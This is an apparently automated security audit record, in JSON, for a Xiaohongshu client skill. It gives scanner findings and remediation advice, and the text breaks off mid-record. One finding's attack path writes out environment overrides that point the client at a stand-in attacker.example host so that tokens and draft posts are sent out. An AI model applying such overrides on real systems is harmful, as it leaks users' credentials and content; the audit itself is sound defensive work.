{"schema":"clawhub.skill.verify.v1","ok":false,"decision":"fail","reasons":["security.status_not_clean"],"slug":"xhs-cn","displayName":"小红书","pageUrl":"https://clawhub.ai/wscats/skills/xhs-cn","publisherHandle":"wscats","publisherDisplayName":"enoyao","publisherProfileUrl":"https://clawhub.ai/wscats","version":"1.0.10","resolvedFrom":"version","tag":null,"createdAt":1777705863669,"card":{"available":true,"path":"skill-card.md","url":"https://wry-manatee-359.convex.site/api/v1/skills/xhs-cn/card?ownerHandle=wscats&version=1.0.10","sha256":"b0b20952207aa3507eb08682af4ccd8106a39e4008813f9c61f635bd9c574fe2","size":2632,"contentType":"text/markdown; charset=utf-8"},"artifact":{"sourceFingerprint":"7e0ffc6173983b196758692b25f658fb378df852d816e8a39f503c60e2262a7e","bundleFingerprints":["0a3eea45ace6b78d06b991002d4ed5024981ff80c0beb91db52dc2e30e437fa4","a17fc265c6051496aebb26b0a4bbe441548044643db43325b3eb38fa765e6f3f"],"files":[{"path":"SETUP.md","size":3400,"sha256":"ee4d070f22b5cf2ce610543d7e4c56166ba958284be5cf90dc70a0695af696a2","contentType":"text/markdown"},{"path":"SKILL.md","size":4288,"sha256":"c0672bf91183b61df689262eae4b601b2c96556cc8812f477ddcd2b2da37e756","contentType":"text/markdown"},{"path":"scripts/publish.sh","size":4199,"sha256":"f9cc851e1c59679a1024e62b782c40bcab34d85017bb0465dc98966e033fa5df","contentType":"text/plain"},{"path":"scripts/xhs_client.py","size":14645,"sha256":"f0dfaddc62f9f5fe158956f990480b2b5ea7a0521ec84ed626965792046128d4","contentType":"text/plain"}]},"provenance":{"source":"unavailable","reason":"No server-resolved GitHub import provenance is stored for this version."},"security":{"status":"suspicious","passed":false,"rawStatus":"suspicious","verdict":"suspicious","confidence":"high","summary":"The skill is mostly coherent, but it has an under-disclosed remote endpoint override that could send Xiaohongshu tokens or draft post content to a non-local server.","model":null,"checkedAt":1789199532483,"scannerReports":{"aig":{"version":"2.1.0","$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/Schemata/sarif-schema-2.1.0.json","runs":[{"tool":{"driver":{"name":"aig-skill-scan","version":"0.2.1","informationUri":"https://github.com/Tencent/AI-Infra-Guard","rules":[{"id":"T01","name":"Skill Instruction Hijacking","shortDescription":{"text":"Alters the agent's current session goals or safety constraints when the skill is loaded"}},{"id":"T02","name":"Agent Memory Poisoning","shortDescription":{"text":"Writes attacker-controlled rules into persistent memory so they continue to affect future sessions"}},{"id":"T03","name":"Remote Payload Retrieval and Execution","shortDescription":{"text":"Fetches code from an external URL, allowing the effective payload to change after skill review"}},{"id":"T04","name":"Embedded Malicious Code","shortDescription":{"text":"Ships malicious scripts inside the skill package and executes them locally when invoked"}},{"id":"T05","name":"Unauthorized Access and Privilege Escalation","shortDescription":{"text":"Breaks least-privilege boundaries by obtaining permissions beyond the task's legitimate needs"}},{"id":"T06","name":"System Persistence","shortDescription":{"text":"Installs cross-session backdoors, hooks, services, or scheduled tasks that survive the skill run"}},{"id":"T07","name":"Tool Hijacking and Spoofing","shortDescription":{"text":"Modifies, wraps, spoofs, or replaces tools so legitimate-looking calls execute attacker logic"}},{"id":"T08","name":"Insecure Dependencies","shortDescription":{"text":"Introduces malicious packages or components through dependency confusion, typosquatting, or unsafe sources"}},{"id":"T09","name":"Insecure Skill Coding Practices","shortDescription":{"text":"Exposes exploitable flaws such as hardcoded secrets, command injection, plaintext sensitive data, or unsafe temp files"}},{"id":"other","name":"Other Risk","shortDescription":{"text":"Security issues not covered by the T01-T09 classification"}}]}},"results":[{"ruleId":"T09","level":"warning","message":{"text":"Remote Endpoint Override Permits Transmission of Sensitive Data to Arbitrary Servers"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":"scripts/xhs_client.py"},"region":{"startLine":41,"endLine":56}}}],"partialFingerprints":{"primaryLocationLineHash":"8471d5b0b057063f"},"properties":{"description":"<![CDATA[\n## Vulnerability Details\n\n**File Location**: `scripts/xhs_client.py`, lines 41–56, 98–105, 147–153, and 276–286  \n**Vulnerability Type**: Arbitrary remote endpoint configuration and plaintext transmission of sensitive request data  \n**Risk Level**: Medium\n\n### Vulnerable Code\n\n```python\n_DEFAULT_BASE_URL = \"http://127.0.0.1:18060\"\n_LOOPBACK_HOSTS = {\"127.0.0.1\", \"localhost\", \"::1\"}\n\n\ndef _resolve_base_url():\n    url = os.environ.get(\"XHS_MCP_BASE_URL\", _DEFAULT_BASE_URL).rstrip(\"/\")\n    try:\n        host = urlparse(url).hostname or \"\"\n    except ValueError:\n        print(f\"❌ Invalid XHS_MCP_BASE_URL: {url!r}\", file=sys.stderr)\n        sys.exit(1)\n    if host not in _LOOPBACK_HOSTS and os.environ.get(\"XHS_ALLOW_REMOTE\") != \"yes\":\n        print(\n            f\"❌ Refusing non-loopback endpoint: {url}. Set XHS_ALLOW_REMOTE=yes \"\n            \"to override at your own risk.\",\n            file=sys.stderr,\n        )\n        sys.exit(1)\n    return url\n```\n\n```python\ndef _request(method, path, **kwargs):\n    \"\"\"Unified request handler with consistent error handling.\n\n    Returns parsed JSON on success, or an error dict on failure.\n    Never exits the process — callers decide how to handle errors.\n    \"\"\"\n    kwargs.setdefault(\"timeout\", DEFAULT_TIMEOUT)\n    url = f\"{BASE_URL}{path}\"\n    try:\n        resp = requests.request(method, url, **kwargs)\n        resp.raise_for_status()\n        return resp.json()\n```\n\n```python\ndef get_note_detail(feed_id, xsec_token, load_comments=False):\n    \"\"\"Get detailed information about a specific note.\"\"\"\n    payload = {\n        \"feed_id\": feed_id,\n        \"xsec_token\": xsec_token,\n        \"load_all_comments\": load_comments\n    }\n    data = _request(\"POST\", \"/api/v1/feeds/detail\", json=payload)\n```\n\n```python\npayload = {\n    \"title\": title,\n    \"content\": content,\n    \"images\": images_list,\n}\nif tags_list:\n    payload[\"tags\"] = tags_list\n\ndata = _request(\"POST\", \"/api/v1/publish\", json=payload, timeout=PUBLISH_TIMEOUT)\n```\n\n### Technical Analysis\n\nThe default API endpoint is a loopback address, which is appropriate for the declared architecture. However, setting both `XHS_MCP_BASE_URL` and `XHS_ALLOW_REMOTE=yes` disables the loopback restriction and permits requests to any host.\n\nThe override does not enforce HTTPS, restrict destinations through an allowlist, or disable HTTP redirects. Consequently, search terms, feed identifiers, Xiaohongshu security tokens, unpublished post content, image URLs, and tags can be transmitted to a remote server over either HTTPS or plaintext HTTP.\n\nThis behavior also conflicts with the documentation in `SKILL.md` and `SETUP.md`, which states that non-loopback endpoints are mechanically rejected. The undocumented effective trust boundary is therefore broader than users may expect.\n\nThe behavior is not evidence of intentional exfiltration because the default remains loopback and the remote mode requires an explicit environment variable. Nevertheless, it exceeds the minimum privileges required by a Skill whose declared operation is limited to a user-managed local MCP component.\n\n### Attack Path\n\n1. An attacker, compromised shell profile, malicious launcher, or contaminated CI environment sets:\n   ```bash\n   export XHS_MCP_BASE_URL=\"http://attacker.example:18060\"\n   export XHS_ALLOW_REMOTE=yes\n   ```\n2. The user or agent invokes a command such as:\n   ```bash\n   python scripts/xhs_client.py detail \"<feed_id>\" \"<xsec_token>\" --comments\n   ```\n   or:\n   ```bash\n   python scripts/xhs_client.py publish \"<title>\" \"<content>\" \"<images>\" --yes\n   ```\n3. The client accepts the non-loopback destination because the override is enabled.\n4. Sensitive request fields are sent to the attacker-controlled endpoint.\n5. The server records the token or draft content and may return fabricated JSON results. For publication requests, it can falsely report success or use any separately available platform access to abuse the submitted data.\n\nA local endpoint that returns a redirect may also move requests outside the intended local trust boundary because redirect handling is not explicitly disabled.\n\n### Impact Assessment\n\nAn attacker can obtain information included in MCP requests, including:\n\n- Feed identifiers and associated `xsec_token` values.\n- Search terms and research interests.\n- Unpublished titles, full post bodies, image URLs, and tags.\n- Operational information inferred from API requests.\n\nThe affected scope is limited to data passed through this client; the code does not directly read browser cookies, credential files, or unrelated local files. However, exposed platform tokens may permit further access depending on their validity and the upstream platform's authorization model. Plaintext HTTP additionally permits interception or modification by an on-path attacker.\n]]>","severity":"Medium"},"fixes":[{"description":{"text":"<![CDATA[\n## Remediation Suggestions\n\n1. Remove `XHS_ALLOW_REMOTE` and reject every endpoint that is not an unambiguous loopback address.\n2. Parse and validate the complete URL:\n   - Permit only `http://127.0.0.1:<expected-port>` or an explicitly approved loopback equivalent.\n   - Reject embedded credentials, fragments, unexpected schemes, and malformed ports.\n   - Resolve hostnames and verify that every resulting address is loopback.\n3. Disable redirects for sensitive API calls:\n   ```python\n   resp = requests.request(method, url, allow_redirects=False, **kwargs)\n   ```\n4. If remote operation is genuinely required:\n   - Require HTTPS.\n   - Maintain a narrow destination allowlist.\n   - Consider certificate or public-key pinning.\n   - Require conspicuous, per-operation user confirmation.\n   - Never permit sensitive publication or token requests over plaintext HTTP.\n5. Update `SKILL.md` and `SETUP.md` so their stated guarantees exactly match runtime behavior.\n6. Add automated tests proving that external hosts, redirect responses, unsupported schemes, and malformed endpoint values are rejected before request data is transmitted.\n]]>"}}]},{"ruleId":"T08","level":"note","message":{"text":"Unpinned Python Dependency Installation Creates Supply-Chain Risk"},"locations":[{"physicalLocation":{"artifactLocation":{"uri":"SETUP.md"},"region":{"startLine":26,"endLine":30}}}],"partialFingerprints":{"primaryLocationLineHash":"54cd041e2b2d5c7a"},"properties":{"description":"<![CDATA[\n## Vulnerability Details\n\n**File Location**: `SETUP.md`, lines 26–30  \n**Vulnerability Type**: Unpinned third-party dependency installation  \n**Risk Level**: Low\n\n### Vulnerable Code\n\n```bash\npip install requests\n```\n\n### Technical Analysis\n\nThe setup procedure installs `requests` without specifying a reviewed version, lock file, package index policy, or integrity hash. As a result, installations performed at different times may resolve to different versions of `requests` and its transitive dependencies.\n\nThe dependency name is legitimate, and the audited project does not specify a suspicious package repository or demonstrate dependency confusion. The issue is therefore a reproducibility and supply-chain hardening weakness rather than evidence that a malicious dependency is currently being installed.\n\nBecause Python packages can execute code during installation and are subsequently imported by `scripts/xhs_client.py`, compromise of the selected package release or package-index resolution path could result in local code execution under the privileges of the user performing setup.\n\n### Attack Path\n\n1. A future release of `requests` or one of its resolved dependencies is compromised, or dependency resolution is redirected to an untrusted package source.\n2. A user follows the documented setup command:\n   ```bash\n   pip install requests\n   ```\n3. `pip` retrieves the currently selected package artifacts without validating project-provided hashes.\n4. Malicious package installation code executes, or malicious runtime code executes when `xhs_client.py` imports `requests`.\n5. The malicious dependency gains the same local privileges and data access as the Python process.\n\n### Impact Assessment\n\nSuccessful exploitation could provide arbitrary Python code execution with the privileges of the installing or executing user. This could expose environment variables, MCP request data, local files accessible to that user, and platform content processed by the client.\n\nThe practical likelihood is reduced because `requests` is a well-known package and no malicious source is specified. The principal risk is the absence of deterministic, integrity-verified dependency resolution.\n]]>","severity":"Low"},"fixes":[{"description":{"text":"<![CDATA[\n## Remediation Suggestions\n\n1. Add a reviewed requirements or lock file containing exact versions for `requests` and all transitive dependencies.\n2. Record cryptographic hashes and require their verification:\n   ```bash\n   python -m pip install --require-hashes -r requirements.txt\n   ```\n3. Use a controlled package index and explicitly prohibit unexpected extra indexes in trusted installation workflows.\n4. Periodically review pinned versions for published vulnerabilities and update them through a controlled review process.\n5. Recommend installation inside a dedicated virtual environment with no elevated privileges:\n   ```bash\n   python -m venv .venv\n   . .venv/bin/activate\n   python -m pip install --require-hashes -r requirements.txt\n   ```\n6. Document the expected Python version and supported dependency versions to make installations reproducible.\n]]>"}}]}],"properties":{"securityScore":65,"primaryLanguage":"Markdown","llm":"gpt-5.6","startTime":1789199409.8863196,"endTime":1789199480.222126}}]},"skillspector":{"skill":{"name":"xiaohongshu","source":"/tmp/clawhub-codex-scan-v5791g6s52cqg79mjdbdhr9b6h8e83rk-NrO85q/clawscan-skillspector-2264982936/artifact","scanned_at":"2026-09-12T07:50:09.250471+00:00"},"risk_assessment":{"score":54,"severity":"HIGH","recommendation":"DO_NOT_INSTALL","max_issue_severity":"HIGH"},"components":[{"path":"SETUP.md","type":"markdown","lines":76,"executable":false,"size_bytes":3400,"source_url":null,"source_identity":null,"source_digest":null},{"path":"SKILL.md","type":"markdown","lines":131,"executable":false,"size_bytes":4288,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/publish.sh","type":"shell","lines":128,"executable":true,"size_bytes":4199,"source_url":null,"source_identity":null,"source_digest":null},{"path":"scripts/xhs_client.py","type":"python","lines":376,"executable":true,"size_bytes":14645,"source_url":null,"source_identity":null,"source_digest":null}],"structured_summaries":[],"issues":[{"id":"TP4","finding_id":"finding-2b8f9f3743a8459ca574254ddcf7d2a6","category":"MCP Tool Poisoning","pattern":null,"severity":"HIGH","confidence":0.99,"location":{"file":"SKILL.md","start_line":1,"end_line":null},"finding":null,"explanation":"The documented purpose is end-user Xiaohongshu operations, but the referenced behavior includes package/repository publishing and version manipulation for ClawHub distribution, which is materially different from user-facing note publishing. This mismatch can mislead operators and automated systems into granting maintainer credentials or executing release workflows under the guise of normal platform automation.","remediation":"Separate maintainer release workflows from the end-user skill entirely. Remove registry/package publishing instructions and version-bump behavior from the skill-facing documentation, or place them in a clearly isolated maintainer-only document with distinct metadata, permissions, and trigger conditions.","code_snippet":null,"intent":null,"tags":["ASI02","AML.T0080"],"evidence":{"code_path":"scripts/publish.sh","code_start_line":1,"code_end_line":128,"actual_behavior_summary":"The supplied code is a maintainer-only repository/package release script that bumps a local version file and publishes this skill package to ClawHub under specific slugs using the clawhub CLI. It explicitly states it is not for publishing Xiaohongshu notes."},"match_fingerprint":null,"occurrences":[{"file":"SKILL.md","start_line":1,"end_line":null}]},{"id":"LP3","finding_id":"finding-7c51ae16da024c26b33eac4390d483ec","category":"MCP Least Privilege","pattern":null,"severity":"MEDIUM","confidence":0.89,"location":{"file":"SKILL.md","start_line":1,"end_line":null},"finding":null,"explanation":"The skill advertises networked/local-client behavior and references environment-gated controls, but it does not declare an explicit tool scope such as allowed tools or permissions. That creates ambiguity for a host agent about whether network and environment access are expected, increasing the chance the skill is invoked with broader capabilities than necessary.","remediation":"Add explicit least-privilege metadata for required capabilities, such as a narrowly scoped permissions/allowed-tools section covering only the exact local execution and loopback HTTP access needed. Document that remote network access, arbitrary filesystem access, and unrelated tool use are not required, and enforce those constraints in the skill manifest if the platform supports it.","code_snippet":null,"intent":null,"tags":["ASI02"],"evidence":{},"match_fingerprint":null,"occurrences":[{"file":"SKILL.md","start_line":1,"end_line":null}]},{"id":"SQP-1","finding_id":"finding-67467d94f8a340729e2c0ab159f7ca12","category":null,"pattern":null,"severity":"MEDIUM","confidence":0.92,"location":{"file":"SKILL.md","start_line":5,"end_line":5},"finding":null,"explanation":"The activation description is broad enough to trigger whenever a user mentions Xiaohongshu/RedNote or wants research/publishing on that platform, without clearly constraining allowed operations or requiring stronger confirmation before sensitive actions. Overbroad triggers increase the risk of unintended skill activation, especially for publishing-capable workflows that can cause real account actions.","remediation":"Tighten the activation criteria so the skill is invoked only for explicit Xiaohongshu operational requests, and distinguish read-only research from write actions like publishing. Require an explicit user intent signal for account-affecting actions and define separate triggers or modes for discovery vs. publication.","code_snippet":null,"intent":null,"tags":[],"evidence":{},"match_fingerprint":null,"occurrences":[{"file":"SKILL.md","start_line":5,"end_line":5}]},{"id":"SQP-3","finding_id":"finding-68bd91c87b6245f5b96c1539a97a8ae5","category":null,"pattern":null,"severity":"MEDIUM","confidence":0.87,"location":{"file":"scripts/xhs_client.py","start_line":314,"end_line":321},"finding":null,"explanation":"The search command hard-codes Chinese strings for sort, type, and time choices, which imposes a specific language/locale in the user-facing interface. The file does not offer an alternative language choice or explain that the skill is intentionally region-specific, so this is a natural-language locale policy issue.","remediation":"Add language-neutral aliases or a user-selectable locale option, or clearly document that the skill is intentionally Chinese-locale-specific and why that constraint is required.","code_snippet":null,"intent":null,"tags":["llm-unconfirmed"],"evidence":{},"match_fingerprint":null,"occurrences":[{"file":"scripts/xhs_client.py","start_line":314,"end_line":321}]}],"suppressed_count":0,"suppressed":[],"metadata":{"has_executable_scripts":true,"skillspector_version":"2.11.2","llm_requested":true,"llm_available":true,"meta_analysis_applied":true,"inference_usage":[{"node":"mcp_tool_poisoning","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":1521,"completion_tokens":326,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":1847},{"node":"mcp_tool_poisoning","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":3797,"completion_tokens":238,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":4035},{"node":"semantic_developer_intent","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2518,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2532},{"node":"semantic_developer_intent","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2916,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2930},{"node":"semantic_developer_intent","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":3017,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":3031},{"node":"semantic_developer_intent","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":5974,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":5988},{"node":"semantic_quality_policy","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2547,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2561},{"node":"semantic_quality_policy","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2945,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2959},{"node":"semantic_quality_policy","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":6003,"completion_tokens":165,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":6168},{"node":"semantic_quality_policy","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":3046,"completion_tokens":210,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":3256},{"node":"semantic_security_discovery","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2079,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2093},{"node":"semantic_security_discovery","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2578,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2592},{"node":"semantic_security_discovery","request_kind":"structured_output","provider":"openai","model":"gpt-5.4-2026-03-05","model_source":"provider_response","usage_source":"provider_response","prompt_tokens":2477,"completion_tokens":14,"cached_tokens":0,"reasoning_tokens":0,"total_tokens":2491},{"node":"semantic_security_disc